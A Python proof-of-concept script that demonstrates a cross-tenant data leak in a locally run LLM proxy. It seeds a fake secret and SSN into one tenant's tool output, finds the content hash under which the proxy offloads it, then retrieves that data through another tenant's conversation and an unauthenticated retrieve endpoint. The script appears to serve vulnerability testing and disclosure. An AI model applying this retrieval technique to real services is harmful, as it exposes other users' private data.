import json, re, urllib.request, os, random, string
CAP=os.environ["CAP"]; CTL=os.environ["CTL"]; PORT="8830"
random.seed(4242)
W=[''.join(random.choices(string.ascii_lowercase,k=8)) for _ in range(3000)]
def http(path):
    return urllib.request.urlopen(f"http://127.0.0.1:{PORT}{path}",timeout=30).read().decode()
def send(msgs):
    body={"model":"claude-sonnet-4-5-20250929","max_tokens":64,"messages":msgs}
    req=urllib.request.Request(f"http://127.0.0.1:{PORT}/v1/messages",data=json.dumps(body).encode(),
        headers={"Content-Type":"application/json","x-api-key":"t","anthropic-version":"2023-06-01"})
    return urllib.request.urlopen(req,timeout=90).read().decode()

SECRET="AKIA-TOPSECRET-CUSTOMER-PII-9931"
rows=[{"id":j,"note":" ".join(random.choices(W,k=60))} for j in range(60)]
rows[31]["note"]=f"customer record {SECRET} ssn=123-45-6789 email=victim@example.com "+" ".join(random.choices(W,k=50))
msgsA=[{"role":"user","content":"tenant A: list customer records"},
  {"role":"assistant","content":[{"type":"tool_use","id":"a1","name":"db","input":{}}]},
  {"role":"user","content":[{"type":"tool_result","tool_use_id":"a1","content":json.dumps(rows)},
                            {"type":"text","text":"summarize"}]}]
send(msgsA)
fwdA=json.loads(open(CAP).read().strip().split("\n")[-1])["body"]
hashes=sorted(set(re.findall(r"<<ccr:([a-f0-9]+)",fwdA)))
print(f"A: {len(hashes)} unique CCR hashes; secret visible to A's model = {SECRET in fwdA}")

victim=None
for h in hashes:
    try:
        r=http(f"/v1/retrieve/{h}")
        if SECRET in r: victim=h; break
    except Exception: pass
print(f"A: hash holding the secret = {victim}")
if not victim: raise SystemExit("secret not offloaded; abort")

print("\n--- Threat model: a DIFFERENT conversation asks for that hash ---")
open(CTL,"w").write(victim)
respB=send([{"role":"user","content":"tenant B: what is the weather today?"}])
fwdB=open(CAP).read().strip().split("\n")[-1]
print(f"  B response contains secret            : {SECRET in respB}")
print(f"  B forwarded-upstream contains secret  : {SECRET in fwdB}")
print(f"  -> conversation B {'RECEIVED' if (SECRET in respB or SECRET in fwdB) else 'did NOT receive'} tenant A's data")
print("\n--- And via the plain HTTP endpoint, no conversation at all ---")
print(f"  GET /v1/retrieve/{victim} returns secret: {SECRET in http('/v1/retrieve/'+victim)}")
